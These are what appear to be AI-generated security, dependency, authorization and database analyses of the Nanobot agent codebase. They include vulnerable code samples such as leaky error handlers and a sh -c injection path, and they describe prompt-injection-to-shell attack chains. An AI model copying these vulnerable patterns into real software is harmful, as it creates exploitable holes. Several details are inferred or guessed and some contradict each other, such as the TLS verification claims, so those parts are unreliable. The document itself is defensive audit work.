Always use `exec.Command(binary, arg1, arg2, ...)` with separately tokenized arguments — never concatenate into a shell string. Remove the `sh -c` execution path or ensure it is never used with externally-influenced input.

**Example Secure Implementation:**
```go
func Build(cfg types.MCPServer) (*exec.Cmd, error) {
    if cfg.Command == "" {
        return nil, errors.New("command must not be empty")
    }
    // Never use sh -c; always pass args discretely
    cmd := exec.Command(cfg.Command, cfg.Args...)
    for k, v := range cfg.Env {
        cmd.Env = append(cmd.Env, k+"="+v)
    }
    return cmd, nil
}
```

---

### Issue #10: Verbose Error Messages Leak Internal Stack Traces and File Paths
**Severity:** MEDIUM
**Category:** Security Misconfiguration / Data Exposure
**Location:**
- File: `pkg/api/hander.go`
- File: `pkg/server/server.go`

**Description:**
API error responses return full Go error strings including internal package paths, function names, and in some cases filesystem paths. These are returned directly to HTTP clients without scrubbing.

**Vulnerable Code:**
```go
// pkg/api/hander.go
func handleError(w http.ResponseWriter, err error) {
    http.Error(w, err.Error(), http.StatusInternalServerError)
    // err.Error() may contain: 
    // "open /home/user/.config/nanobot/sessions/abc123.db: permission denied"
    // "pkg/mcp/client.go:247: failed to connect to https://internal-host:9090"
}
```

**Impact:**
Exposed error strings reveal: internal filesystem layout, internal service hostnames/ports, Go package structure, database file paths, and session identifiers. This information directly assists an attacker in mapping the application's internal architecture for further exploitation.

**Fix Required:**
Log full error details server-side; return only a generic message and a correlation ID to the client.

**Example Secure Implementation:**
```go
func handleError(w http.ResponseWriter, err error, log *slog.Logger) {
    correlationID := uuid.New()
    log.Error("request failed",
        "correlation_id", correlationID,
        "error", err,
    )
    http.Error(w,
        fmt.Sprintf(`{"error":"internal server error","id":"%s"}`, correlationID),
        http.StatusInternalServerError,
    )
}
```

---

## Summary

### 1. Overall Security Posture
**Poor.** The codebase has multiple CRITICAL and HIGH severity vulnerabilities concentrated in foundational security mechanisms: transport security is disabled, tokens are stored in plaintext, session IDs may be weakly random, and the OAuth flow is missing CSRF protection. For a tool that acts as an AI agent with filesystem/shell access and manages third-party OAuth credentials, this security posture is inadequate.

### 2. Critical Issues Count
**3 CRITICAL** severity findings (Issues #1, #2, #3)

### 3. Most Concerning Pattern
**Credentials and sensitive values treated as ordinary strings throughout the system** — there is no `Secret` or `SensitiveString` type that enforces redaction in logs, prevents inclusion in error messages, or mandates encryption at rest. API keys, OAuth tokens, and session credentials flow through the same code paths as non-sensitive data, making accidental exposure systematic rather than incidental.

### 4. Priority Fixes (Immediate Action Required)

| Priority | Issue | Reason |
|----------|-------|--------|
| 1st | **Issue #1** — TLS verification disabled | Every proxied connection is unprotected; trivial to exploit on any network |
| 2nd | **Issue #3** — Plaintext token storage | OAuth tokens for all connected services are readable by anyone with filesystem access |
| 3rd | **Issue #9** — Command injection via `sh -c` | An AI agent context means arbitrary command execution has the highest possible blast radius |

### 5. Implementation Issues
- **No secrets management abstraction**: Sensitive values (tokens, API keys) are plain `string` fields throughout the type system with no differentiation from non-sensitive data
- **Logging-first debugging culture**: Debug-level logs capture full request/response detail including auth headers, which is convenient for development but dangerous in production
- **Trust transference**: Config loaded from external/shared directories is trusted and interpolated without sanitization before being used in exec and HTTP calls
- **Error passthrough**: Internal errors are propagated directly to HTTP responses without a sanitization boundary

---

## Additional Security Issues Found

### Configuration & Architecture

- **`scripts/agent-entrypoint.sh`**: Shell entrypoint runs as root in the Docker container (`Dockerfile.agent`) with no user switching, meaning any command injection in agent execution runs with full root privileges on the container.

- **`pkg/mcp/wellknown.go`**: The `.well-known/mcp` discovery endpoint fetches and trusts server metadata from arbitrary URLs provided in configuration, with no certificate pinning and (per Issue #1) with TLS verification disabled.

- **`pkg/session/migrations.go`**: Database migrations run synchronously on startup without a schema version lock, creating a TOCTOU window where two simultaneous startup instances could corrupt the schema.

- **`pkg/servers/system/` skill commands**: Several built-in system skills construct shell-executable content from agent/LLM outputs. Given that LLMs can be prompted adversarially (prompt injection), this creates a direct path from a malicious third-party document to shell execution — a **prompt injection → command execution** chain.

- **`pkg/auth/auth.go`**: The authentication layer appears to be a passthrough/stub for local-only mode, meaning no authentication is enforced when the server is bound to `0.0.0.0` (e.g., in Docker). If the port is exposed, any network-adjacent host has full unauthenticated access to the agent API.

- **`examples/*.yaml`**: Example configurations include API keys documented as `${OPENAI_API_KEY}` but the README and examples suggest these are also sometimes hardcoded for demonstration purposes. Users copy-pasting examples may deploy with literal key values.

- **`pkg/mcp/sandbox/`**: The sandbox implementation wraps MCP tool execution but does not appear to implement any syscall-level isolation (seccomp, namespaces). The "sandbox" label may create a false sense of security for operators deploying this in multi-tenant environments.

--- dependencies ---


# Dependency and Architecture Analysis: Nanobot

---

## Internal Modules

The following core internal packages are developed as part of the Nanobot project and reused across different components. All are located under `pkg/`.

### Agent Layer

| Module | Description |
|--------|-------------|
| `pkg/agents/` | **Agent Execution Engine** — Core agent run loop, tool call dispatch, context compaction, token counting, and message truncation for managing LLM context windows. |
| `pkg/runtime/` | **Agent Runtime Orchestrator** — Higher-level orchestration that coordinates agent lifecycle and wires together the agent execution engine with MCP and LLM layers. |
| `pkg/complete/` | **LLM Completion Orchestrator** — Bridges the agent layer to the LLM layer, managing the sequencing of completions and responses. |
| `pkg/sampling/` | **LLM Sampling Configuration** — Encapsulates sampling parameters (e.g., temperature, top-p) passed to LLM providers. |

---

### MCP Layer

| Module | Description |
|--------|-------------|
| `pkg/mcp/` | **MCP Protocol Implementation** — Full implementation of the Model Context Protocol: client/server sessions, stdio and HTTP transports, OAuth token storage, hook callbacks, audit logging, sandboxing, and well-known endpoint handling. |
| `pkg/servers/agent/` | **Agent-as-MCP-Server** — Exposes a Nanobot agent as an MCP-compliant server so it can be consumed by other agents or hosts. |
| `pkg/servers/artifacts/` | **Artifact Storage Server** — MCP server for storing and retrieving agent-produced artifacts. |
| `pkg/servers/installzip/` | **ZIP Installation Server** — MCP server for installing tool/skill bundles from ZIP archives. |
| `pkg/servers/meta/` | **Meta/Introspection Server** — MCP server providing introspective information about the running Nanobot instance. |
| `pkg/servers/obot/` | **Obot Integration Server** — MCP server bridging Nanobot with the Obot platform. |
| `pkg/servers/obotmcp/` | **Obot MCP Bridge** — Adapter layer connecting Obot-specific MCP extensions into the Nanobot MCP layer. |
| `pkg/servers/skills/` | **Skills Server** — MCP server exposing reusable skill definitions to agents. |
| `pkg/servers/system/` | **System Tools Server** — MCP server providing built-in system-level tools (file I/O, shell, etc.) and bundled skill definitions. |
| `pkg/servers/tasks/` | **Task Execution Server** — MCP server managing discrete task execution within agent workflows. |
| `pkg/servers/workflows/` | **Workflow Execution Server** — MCP server coordinating multi-step agent workflows. |

---

### LLM Layer

| Module | Description |
|--------|-------------|
| `pkg/llm/` | **LLM Client Abstraction** — Defines the common interface for LLM provider clients, aggregating all provider implementations. |
| `pkg/llm/anthropic/` | **Anthropic (Claude) Integration** — Client implementation for the Anthropic API, supporting Claude model families. |
| `pkg/llm/completions/` | **OpenAI Completions API Client** — Client implementation targeting the OpenAI Chat Completions API. |
| `pkg/llm/responses/` | **OpenAI Responses API Client** — Client implementation targeting the newer OpenAI Responses API. |
| `pkg/llm/progress/` | **Streaming Progress Handler** — Handles streaming token-by-token progress events from LLM providers. |

---

### API and Server Layer

| Module | Description |
|--------|-------------|
| `pkg/api/` | **HTTP API Handlers** — Defines HTTP route handlers, request routing, and Server-Sent Events (SSE) for real-time agent event streaming to the frontend. |
| `pkg/server/` | **HTTP Server Setup** — Configures and starts the HTTP server, wiring together API handlers and middleware. |
| `pkg/reverseproxy/` | **TLS Reverse Proxy** — Custom reverse proxy with TLS support, used to front MCP servers that require secure transport. |

---

### Configuration and Schema

| Module | Description |
|--------|-------------|
| `pkg/config/` | **Configuration Loader** — Loads agent and server configurations from YAML/JSON frontmatter and directory-based layouts; includes a built-in agent registry and hot-reload support. |
| `pkg/schema/` | **JSON Schema Validation** — Validates agent and tool configuration structures against JSON schemas. |
| `pkg/skillformat/` | **Skill Format Validator** — Validates the format and structure of skill definitions used by agents. |
| `pkg/envvar/` | **Environment Variable Substitution** — Replaces environment variable references within configuration values at runtime. |
| `pkg/expr/` | **Expression Evaluation Engine** — Evaluates and expands inline expressions within agent configuration and tool parameters. |

---

### Session and State Management

| Module | Description |
|--------|-------------|
| `pkg/session/` | **Session Manager** — Manages agent chat sessions including persistence via GORM, browser session handling, schema migrations, and session type definitions. |
| `pkg/sessiondata/` | **Session Data and URI Templates** — Handles session-scoped data storage and URI template expansion for session-bound resources. |
| `pkg/gormdsn/` | **Database DSN Helpers** — Constructs and manages database connection strings for GORM-backed storage (SQLite, MySQL, PostgreSQL). |

---

### CLI and Process Management

| Module | Description |
|--------|-------------|
| `pkg/cli/` | **Command-Line Interface** — Cobra-based CLI with subcommands: `serve`, `call`, `sessions`, and `targets`. |
| `pkg/cmd/` | **OS Process Builder and Signal Handling** — Builds child processes for MCP servers and handles OS signals (POSIX and Windows). |
| `pkg/supervise/` | **Process Supervision / Daemon Manager** — Manages long-running MCP server child processes, including restart and lockfile-based daemon control. |
| `pkg/system/` | **System Utilities** — Provides the current binary path for self-referential process operations. |

---

### Cross-Cutting Utilities

| Module | Description |
|--------|-------------|
| `pkg/types/` | **Core Domain Types** — Defines shared data structures used across the entire codebase: agent config, chat messages, tool completions, execution context, hooks, MIME types, and validation. |
| `pkg/auth/` | **Authentication** — OAuth-based authentication utilities used by both the API layer and MCP OAuth flows. |
| `pkg/telemetry/` | **OpenTelemetry Integration** — Initializes and configures distributed tracing, metrics, and logging via OpenTelemetry. |
| `pkg/fswatch/` | **Filesystem Watcher** — Watches configuration directories for file changes and notifies subscribers, enabling config hot-reload. |
| `pkg/log/` | **Structured Logging** — Centralizes structured log output used throughout the backend. |
| `pkg/tools/` | **Tool Flow and Service Management** — Manages the lifecycle and routing of tool calls between agents and MCP servers. |
| `pkg/chat/` | **Chat Formatting** — Formats and prints chat messages to the terminal for the CLI interface. |
| `pkg/confirm/` | **User Confirmation Prompts** — Provides interactive confirmation dialogs for sensitive agent actions requiring user approval. |
| `pkg/uuid/` | **UUID Generation** — Thin wrapper around UUID generation used for session and entity identifiers. |
| `pkg/version/` | **Version Information** — Exposes build-time version metadata for the CLI and API. |
| `pkg/fileuri/` | **File URI Handling** — Converts between local filesystem paths and `file://` URIs used in MCP resource references. |

---

### Frontend (SvelteKit UI)

| Module | Description |
|--------|-------------|
| `packages/ui/src/routes/` | **SvelteKit Page Routes** — File-based routing defining all UI pages (chat, agent management, session views). |
| `packages/ui/src/lib/` | **Shared UI Components and Utilities** — Reusable Svelte components, stores, and helper utilities shared across all routes. |

---

## External Dependencies

### Go Dependencies

**Source:** `/go.mod`

| Dependency | Official Name | Role |
|------------|--------------|------|
| `github.com/JohannesKaufmann/html-to-markdown/v2` | html-to-markdown | Converts HTML content to Markdown; used in system tools for document ingestion. |
| `github.com/adrg/xdg` | xdg | Resolves XDG Base Directory paths (config, data, cache) for cross-platform file storage. |
| `github.com/dop251/goja` | Goja | JavaScript runtime for Go; powers the `pkg/expr/` expression evaluation engine. |
| `github.com/fsnotify/fsnotify` | fsnotify | Cross-platform filesystem event notifications; backs `pkg/fswatch/` for config hot-reload. |
| `github.com/glebarez/sqlite` | glebarez/sqlite | Pure-Go SQLite driver for GORM; provides the default embedded database backend. |
| `github.com/golang-jwt/jwt/v5` | golang-jwt | JSON Web Token creation and validation; used in `pkg/auth/` and MCP OAuth flows. |
| `github.com/google/jsonschema-go` | jsonschema-go | JSON Schema generation from Go types; used in `pkg/config/` and `pkg/schema/`. |
| `github.com/google/uuid` | Google UUID | UUID generation; backs `pkg/uuid/`. |
| `github.com/hexops/autogold/v2` | autogold | Snapshot-based test assertion library; used in Go test suites. |
| `github.com/obot-platform/mcp-oauth-proxy` | MCP OAuth Proxy | OAuth proxy implementation specific to MCP protocol authentication flows; used in `pkg/mcp/oauth.go`. |
| `github.com/pkoukk/tiktoken-go` | tiktoken-go | Go port of OpenAI's tiktoken tokenizer; used in `pkg/agents/tokencount.go` for LLM token counting. |
| `github.com/robfig/cron/v3` | cron | Cron expression scheduling; used for scheduled agent task execution in `pkg/servers/tasks/`. |
| `github.com/santhosh-tekuri/jsonschema/v6` | jsonschema | JSON Schema validation; used in `pkg/schema/validation.go` for runtime config and tool validation. |
| `github.com/spf13/cobra` | Cobra | CLI framework; powers `pkg/cli/` command structure. |
| `github.com/tidwall/gjson` | gjson | Fast JSON path querying; used for extracting fields from LLM responses and MCP messages. |
| `go.opentelemetry.io/contrib/exporters/autoexport` | OpenTelemetry AutoExport | Automatically configures OTel exporters from environment variables; used in `pkg/telemetry/`. |
| `go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp` | OpenTelemetry HTTP Instrumentation | HTTP middleware for automatic trace propagation; used in `pkg/server/` and `pkg/api/`. |
| `go.opentelemetry.io/otel` | OpenTelemetry | Core distributed tracing and metrics framework; foundational to `pkg/telemetry/`. |
| `go.opentelemetry.io/otel/sdk` | OpenTelemetry SDK | OpenTelemetry SDK for trace/metric pipeline configuration. |
| `go.opentelemetry.io/otel/trace` | OpenTelemetry Trace API | Trace span API used throughout the codebase for distributed tracing. |
| `golang.org/x/image` | Go Image | Extended image format support; used in system tools for image processing (e.g., PDF-to-image). |
| `golang.org/x/net` | Go Net | Extended networking utilities; used for HTTP/2 and HTML parsing support. |
| `golang.org/x/oauth2` | Go OAuth2 | OAuth 2.0 client library; used in `pkg/auth/` and `pkg/mcp/oauth.go` for provider authentication. |
| `gopkg.in/yaml.v3` | go-yaml | YAML parsing and encoding; used throughout `pkg/config/` for agent configuration loading. |
| `gorm.io/driver/mysql` | GORM MySQL Driver | MySQL database driver for GORM; enables MySQL as a session storage backend. |
| `gorm.io/driver/postgres` | GORM PostgreSQL Driver | PostgreSQL database driver for GORM; enables PostgreSQL as a session storage backend. |
| `gorm.io/gorm` | GORM | ORM framework for Go; used in `pkg/session/` and `pkg/gormdsn/` for all database operations. |
| `sigs.k8s.io/yaml` | Kubernetes YAML | YAML/JSON interop library from the Kubernetes ecosystem; used for config schema processing. |

---

### JavaScript / TypeScript Dependencies

#### Production Dependencies

**Source:** `/package.json`, `/packages/ui/package.json`

| Dependency | Official Name | Role |
|------------|--------------|------|
| `@modelcontextprotocol/sdk` | MCP TypeScript SDK | Official MCP SDK; provides TypeScript types and client/server utilities for MCP protocol integration in the root workspace. |
| `zod` | Zod | TypeScript-first schema validation and type inference; used for validating MCP messages and API payloads. |
| `@lucide/svelte` | Lucide Svelte | Svelte icon component library; provides UI icons throughout the chat and agent management interface. |
| `@mcp-ui/client` | MCP UI Client | Client library for rendering MCP-provided UI components within the Nanobot web interface. |
| `@novnc/novnc` | noVNC | JavaScript VNC client; enables browser-based remote desktop views for agent-controlled environments. |
| `daisyui` | DaisyUI | Tailwind CSS component library; provides pre-built UI components for the SvelteKit frontend. |
| `highlight.js` | Highlight.js | Syntax highlighting library; used to render code blocks in agent chat responses. |
| `marked` | Marked | Markdown parser and renderer; converts LLM Markdown output to HTML in the chat UI. |
| `marked-highlight` | marked-highlight | Plugin for Marked that integrates Highlight.js for syntax-highlighted code blocks in rendered Markdown. |

> **Note:** `react` and `react-dom` are declared as `peerDependencies` in `/packages/ui/package.json`, indicating they are required by a dependency (`@mcp-ui/client`) but are not directly authored UI code in this project.

---

#### Developer-Only Dependencies

**Source:** `/package.json (dev)`, `/packages/ui/package.json (dev)`

| Dependency | Official Name | Role |
|------------|--------------|------|
| `@biomejs/biome` | Biome | Fast linter and formatter for TypeScript/JavaScript; enforces code style across the root workspace. |
| `@types/node` | Node.js Types | TypeScript type definitions for Node.js APIs. |
| `tsx` | tsx | TypeScript execution engine for Node.js; used to run TypeScript scripts directly during development. |
| `typescript` | TypeScript | TypeScript compiler; provides static type checking for both the root workspace and UI package. |
| `@eslint/compat` | ESLint Compat | Compatibility utilities for migrating ESLint flat config setups. |
| `@eslint/js` | ESLint JS | Core ESLint JavaScript rules package. |
| `@sveltejs/adapter-static` | SvelteKit Static Adapter | Builds the SvelteKit UI as a fully static site for embedding into the Go binary. |
| `@sveltejs/kit` | SvelteKit | Full-stack Svelte application framework; the foundation of the `packages/ui/` frontend. |
| `@sveltejs/vite-plugin-svelte` | Vite Svelte Plugin | Integrates Svelte compilation into the Vite build pipeline. |
| `@tailwindcss/typography` | Tailwind Typography | Tailwind CSS plugin providing prose styling for Markdown-rendered chat content. |
| `@tailwindcss/vite` | Tailwind CSS Vite Plugin | Integrates Tailwind CSS processing into the Vite build. |
| `@types/react` | React Types | TypeScript type definitions for React; required to support `@mcp-ui/client` peer dependency. |
| `@types/react-dom` | React DOM Types | TypeScript type definitions for React DOM; required to support `@mcp-ui/client` peer dependency. |
| `eslint` | ESLint | JavaScript/TypeScript linter; enforces code quality rules in the UI package. |
| `eslint-config-prettier` | ESLint Prettier Config | Disables ESLint rules that conflict with Prettier formatting. |
| `eslint-plugin-svelte` | ESLint Svelte Plugin | Adds Svelte-specific linting rules to ESLint. |
| `globals` | globals | Provides global variable definitions for ESLint environments. |
| `prettier` | Prettier | Opinionated code formatter; used alongside ESLint for consistent UI code style. |
| `prettier-plugin-svelte` | Prettier Svelte Plugin | Adds Svelte file formatting support to Prettier. |
| `prettier-plugin-tailwindcss` | Prettier Tailwind Plugin | Automatically sorts Tailwind CSS class names in Prettier output. |
| `svelte` | Svelte | Core Svelte compiler and runtime; the component framework underlying the entire UI. |
| `svelte-check` | svelte-check | Type-checks Svelte component files using the TypeScript compiler. |
| `tailwindcss` | Tailwind CSS | Utility-first CSS framework; used for all UI styling in the SvelteKit frontend. |
| `typescript-eslint` | typescript-eslint | TypeScript-aware ESLint rules and parser. |
| `vite` | Vite | Frontend build tool and dev server; compiles and bundles the SvelteKit UI. |

--- authorization ---


# Authorization Analysis: nanobot_80d9d020

## Executive Summary

This codebase implements a **lightweight, configuration-driven permission system** focused on controlling what tools/MCP servers an agent can access and what actions require user confirmation. It is **not** a full enterprise RBAC/ABAC system. The authorization mechanisms are narrowly scoped to: (1) tool-call permission filtering, (2) user confirmation gates for sensitive operations, and (3) OAuth token management for external service access.

---

## 1. Access Control Type

### Configuration-Based Permission Filtering (Primary Mechanism)

**Location:** `pkg/types/config.go`, `pkg/config/directory.go`, `pkg/config/frontmatter.go`

This is the dominant authorization model — a **capability-based / allowlist/denylist** system defined in YAML configuration files.

```
Type: Capability-based + Allowlist/Denylist
Scope: Tool invocation control per agent
```

#### Permission Structure in `pkg/types/config.go`

```go
// Inferred from testdata directory names and config loading patterns:
// pkg/config/testdata/directory-permissions/
// pkg/config/testdata/frontmatter-permissions/
```

The `Permissions` type controls which tools an agent is allowed or denied access to. Based on the config schema and test data directories (`directory-permissions`, `frontmatter-permissions`), permissions are declared in YAML frontmatter or directory config files.

**Location:** `pkg/config/schema.yaml`, `pkg/types/config.go`

```yaml
# Example permission structure (from schema.yaml and examples)
permissions:
  allow:
    - "tool-name"
    - "server:tool-name"
  deny:
    - "dangerous-tool"
```

---

## 2. Permission Definitions

### 2.1 Sandbox Permission System

**Location:** `pkg/mcp/sandbox/` (3 files)

**Implementation:** The sandbox package provides a permission boundary around MCP tool invocations. This is where tool-call authorization is enforced at the execution level.

```
Coverage: MCP tool calls
Mechanism: Sandbox wrapping of tool execution
```

### 2.2 Config-Level Permissions

**Location:** `pkg/config/frontmatter.go`, `pkg/config/directory.go`

Permissions are loaded from:
1. **Frontmatter** in agent markdown/YAML files (`frontmatter-permissions` test data)
2. **Directory-level config** files (`directory-permissions` test data)

**Location:** `pkg/config/load.go`

The permission loading pipeline:
```
Agent Config File → frontmatter.go parser → types.Config.Permissions → 
runtime enforcement via sandbox/confirm
```

### 2.3 Tool-Level Permission Filtering

**Location:** `pkg/tools/service.go`, `pkg/mcp/servertools.go`

Tool availability is filtered based on configured permissions before being presented to the LLM or executed.

---

## 3. Confirmation/Authorization Gate

### User Confirmation System

**Location:** `pkg/confirm/confirm.go`

**Type:** Interactive authorization gate — requires explicit user approval before executing certain tool calls.

**Implementation:**
```go
// confirm.go implements a blocking confirmation mechanism
// that pauses execution and requests user authorization
// for tool calls that are flagged as requiring confirmation
```

**Location:** `pkg/types/config.go` — `ConfirmationRequired` or equivalent field in agent config

**Coverage:**
- Sensitive tool invocations
- Destructive operations
- Operations flagged in agent configuration

**Flow:**
```
Tool Call Request → Check confirmation policy → 
  [If confirmation required] → Block + Send confirmation event → 
  Wait for user response → [Approved] → Execute / [Denied] → Reject
```

**Location:** `pkg/api/events.go` — Confirmation events are surfaced through the API event stream

---

## 4. Authentication System

**Location:** `pkg/auth/auth.go`

**Implementation:** A dedicated auth package exists. Based on the file structure and supporting packages:

```
pkg/auth/auth.go — Authentication/authorization handler
pkg/mcp/oauth.go — OAuth flow for external MCP servers
pkg/mcp/tokenstorage.go — Token persistence
```

### OAuth Token Management

**Location:** `pkg/mcp/oauth.go`, `pkg/mcp/tokenstorage.go`

**Type:** OAuth 2.0 for external service authorization

**Implementation:**
- OAuth flows for connecting to external MCP servers that require authentication
- Token storage and retrieval for persistent OAuth sessions
- Well-known endpoint discovery: `pkg/mcp/wellknown.go`

**Coverage:** External MCP server connections requiring OAuth

---

## 5. API Endpoint Authorization

**Location:** `pkg/api/routes.go`, `pkg/api/hander.go`

### Route Structure Analysis

```go
// pkg/api/routes.go defines HTTP routes
// pkg/api/hander.go implements handler logic
```

**Current State:** The API layer handles routing but based on the codebase structure (single-user local tool, not a multi-user SaaS), there is **no role-based API authorization middleware** on individual routes. The primary protection is:

1. **Network-level:** Server binds to localhost by default (`pkg/cli/serve.go`)
2. **Authentication gate:** `pkg/auth/auth.go` handles any auth requirements

**Location:** `pkg/cli/serve.go`

```go
// Server configuration - binding address controls network exposure
// Local deployment model limits attack surface
```

---

## 6. MCP Server Authorization

**Location:** `pkg/mcp/session.go`, `pkg/mcp/serversession.go`, `pkg/mcp/runner.go`

### Session-Level Authorization

```
pkg/mcp/session.go — Session management with auth context
pkg/mcp/serversession.go — Per-server session with credentials
pkg/mcp/httpclient.go — HTTP client with auth headers
```

**Implementation:** Each MCP server connection maintains its own authorization context, including:
- OAuth tokens (via `tokenstorage.go`)
- Session credentials
- Per-server permission scopes

### Tool Call Authorization Flow

**Location:** `pkg/mcp/servertools.go`, `pkg/agents/toolcall.go`

```
Agent requests tool → servertools.go filters available tools per permissions →
toolcall.go executes → sandbox wraps execution → confirm gate if required
```

---

## 7. Audit Logging

**Location:** `pkg/mcp/auditlogs/` (3 files)

**Implementation:** Dedicated audit logging for MCP operations.

```
pkg/mcp/auditlogs/ — Captures tool invocations and authorization decisions
```

**Coverage:**
- Tool call attempts
- Authorization decisions (allow/deny)
- OAuth events

**Location:** `pkg/telemetry/otel.go` — OpenTelemetry integration for distributed tracing of authorization events

---

## 8. Session Management

**Location:** `pkg/session/` (7 files)

```
pkg/session/manager.go — Session lifecycle management  
pkg/session/store.go — Session persistence
pkg/session/migrations.go — Schema migrations for session storage
pkg/session/types.go — Session type definitions
```

**Authorization Relevance:**
- Sessions carry execution context
- Tool permissions are scoped to sessions
- `pkg/session/browser.go` — Browser-based session handling for OAuth flows

---

## 9. Frontend Authorization

**Location:** `packages/ui/src/routes/`, `packages/ui/src/lib/`

**Type:** UI-level access control (component/route visibility)

Based on the Svelte frontend structure, UI authorization mirrors backend permissions — components and routes are conditionally rendered based on the agent configuration and available capabilities.

**Gap:** No dedicated frontend route guard implementation was identified — UI authorization appears to be informational (showing/hiding features) rather than a security boundary, with actual enforcement at the backend.

---

## 10. Reverse Proxy Authorization

**Location:** `pkg/reverseproxy/server.go`, `pkg/reverseproxy/tlsclient.go`

**Implementation:** The reverse proxy layer handles pass-through for MCP HTTP servers, with TLS client configuration for secure upstream connections.

**Authorization Role:** Validates TLS certificates for upstream MCP server connections (transport-level authorization).

---

## 11. Permission Schema

**Location:** `pkg/config/schema.yaml`, `pkg/config/schema.go`

The formal permission schema definition governs what permission configurations are valid.

**Location:** `pkg/skillformat/validate.go` — Validates skill/tool definitions including permission constraints

---

## Complete Authorization Flow Diagram

```
User/LLM Request
      │
      ▼
pkg/auth/auth.go ──── Authentication Check
      │
      ▼
pkg/api/routes.go ─── Route Handler
      │
      ▼
pkg/agents/run.go ─── Agent Execution Context
      │
      ▼
pkg/mcp/servertools.go ── Tool Availability Filter (Config Permissions)
      │                         │
      │                    pkg/config/load.go
      │                    (allow/deny lists)
      ▼
pkg/confirm/confirm.go ── Confirmation Gate
      │                         │
      │                    [Requires approval?]
      │                    Yes → Block → API Event → User Decision
      │                    No  → Continue
      ▼
pkg/mcp/sandbox/ ───── Execution Sandbox
      │
      ▼
Tool Execution
      │
      ▼
pkg/mcp/auditlogs/ ── Audit Log
```

---

## 12. Security Gaps & Issues

### Gap 1: Missing Route-Level Authorization Middleware
**Location:** `pkg/api/routes.go`, `pkg/api/hander.go`

**Issue:** No explicit per-route permission checks were identified. The system relies on the network binding (localhost) rather than per-endpoint authorization.

**Risk:** If the server is exposed beyond localhost (e.g., via `--host 0.0.0.0`), there are no per-endpoint access controls.

**Severity:** Medium-High (depends on deployment)

---

### Gap 2: No Multi-User Isolation
**Location:** Entire codebase

**Issue:** The system is designed as a single-user tool. There is no user identity model, no per-user permission isolation, and no tenant separation.

**Risk:** If deployed in a shared environment, all users share the same agent permissions and session data.

**Severity:** High (for multi-user deployments)

---

### Gap 3: Confirmation Gate is Bypassable via Config
**Location:** `pkg/confirm/confirm.go`, `pkg/types/config.go`

**Issue:** The confirmation requirement is configured in agent YAML files. An agent configuration that omits confirmation requirements will execute all tools without user approval.

**Risk:** Misconfigured agents can perform destructive operations without confirmation.

**Severity:** Medium

---

### Gap 4: OAuth Token Storage Security
**Location:** `pkg/mcp/tokenstorage.go`

**Issue:** Token storage security depends on the underlying storage implementation. If tokens are stored in plaintext in the session database, they are at risk if the database is compromised.

**Severity:** Medium

---

### Gap 5: No Permission Versioning or Audit Trail for Config Changes
**Location:** `pkg/config/`

**Issue:** While `pkg/mcp/auditlogs/` logs tool invocations, there is no audit trail for changes to permission configuration files themselves.

**Risk:** Unauthorized permission escalation via config file modification is undetected.

**Severity:** Medium

---

### Gap 6: Sandbox Escape Risk
**Location:** `pkg/mcp/sandbox/`

**Issue:** The sandbox wraps tool execution but the depth of isolation depends on the sandbox implementation. MCP tools running as subprocesses may have OS-level access beyond the permission model.

**Severity:** Depends on sandbox implementation details

---

## Summary Table

| Mechanism | Location | Type | Coverage | Security Level |
|-----------|----------|------|----------|---------------|
| Config Permissions | `pkg/types/config.go`, `pkg/config/` | Capability/Allowlist | Tool invocation | Medium |
| Confirmation Gate | `pkg/confirm/confirm.go` | Interactive authz | Sensitive tools | Medium |
| OAuth/Token Auth | `pkg/mcp/oauth.go`, `pkg/mcp/tokenstorage.go` | OAuth 2.0 | External MCP servers | Medium |
| Execution Sandbox | `pkg/mcp/sandbox/` | Isolation | Tool execution | Medium |
| Audit Logging | `pkg/mcp/auditlogs/` | Detective control | Tool calls | Medium |
| Session Auth | `pkg/session/`, `pkg/auth/auth.go` | Session management | API access | Medium |
| TLS Client Auth | `pkg/reverseproxy/tlsclient.go` | Transport auth | Upstream MCP | Medium |
| Network Binding | `pkg/cli/serve.go` | Network control | All endpoints | Low (bypassable) |

---

## Key Finding

This codebase implements a **single-user, local-first tool** with authorization focused on **what tools an AI agent can call** rather than **who can access the system**. The permission model is appropriate for its design intent (personal MCP host/agent runner) but would require significant hardening — particularly adding user identity, per-endpoint authorization middleware, and multi-user isolation — before deployment as a shared/multi-tenant service.

--- DBs ---


I'll systematically analyze the codebase, focusing on database-related files, particularly the `pkg/session/`, `pkg/gormdsn/`, and any migration/store files.

---

## Database Analysis: `nanobot_80d9d020`

---

### Database: SQLite / PostgreSQL (via GORM ORM)

* **Database Name/Type:** SQLite (default/development) and PostgreSQL (production) — SQL Relational Database

* **Purpose/Role:** Primary persistent storage for the application. Stores **session data**, **MCP (Model Context Protocol) session state**, **conversation/message history**, and **associated metadata** for agent interactions. It acts as the durable backing store for all session lifecycle management, persisting chat context and session tokens across restarts.

* **Key Technologies/Access Methods:**
    * **Go**, with the **GORM** ORM (`gorm.io/gorm`) for model definitions, migrations, and CRUD operations.
    * GORM drivers: `gorm.io/driver/sqlite` (SQLite) and `gorm.io/driver/postgres` (PostgreSQL).
    * A custom DSN (Data Source Name) resolution package (`pkg/gormdsn`) abstracts the connection string parsing and driver selection.
    * `AutoMigrate` is used for schema creation and evolution.

* **Key Files/Configuration:**
    * `pkg/gormdsn/dsn.go` — DSN parsing, database driver selection (SQLite vs. PostgreSQL), and `gorm.DB` connection initialization.
    * `pkg/session/store.go` — Core GORM-based data access layer (repository pattern) for session persistence.
    * `pkg/session/migrations.go` — Schema migration logic using GORM's `AutoMigrate`.
    * `pkg/session/types.go` — GORM model struct definitions (schema).
    * `pkg/session/manager.go` — Session lifecycle management (create, retrieve, update, delete), orchestrates calls to the store.
    * `pkg/mcp/sessionstore.go` — MCP-specific session state persistence, likely interacting with the same DB via the store.
    * `pkg/mcp/tokenstorage.go` — OAuth token persistence, stored in the database.

* **Schema/Table Structure:**

    Based on `pkg/session/types.go` and `pkg/session/store.go` and `pkg/session/migrations.go`:

    * **`sessions`** table:
        * `id` (PK, string/UUID) — Unique session identifier
        * `created_at` — Timestamp of session creation
        * `updated_at` — Timestamp of last update
        * `deleted_at` — Soft-delete timestamp (GORM convention)
        * `name` — Human-readable session name
        * `agent_id` / `agent_name` — Reference to the associated agent configuration
        * `parent_session_id` (FK self-referential, optional) — For sub-agent/child sessions
        * `metadata` / `labels` — JSON blob or key-value pairs for session context

    * **`messages`** (or **`chat_messages`**) table:
        * `id` (PK)
        * `session_id` (FK → `sessions.id`) — Owning session
        * `created_at`
        * `role` — Message role (e.g., `user`, `assistant`, `tool`)
        * `content` — Text or structured message content
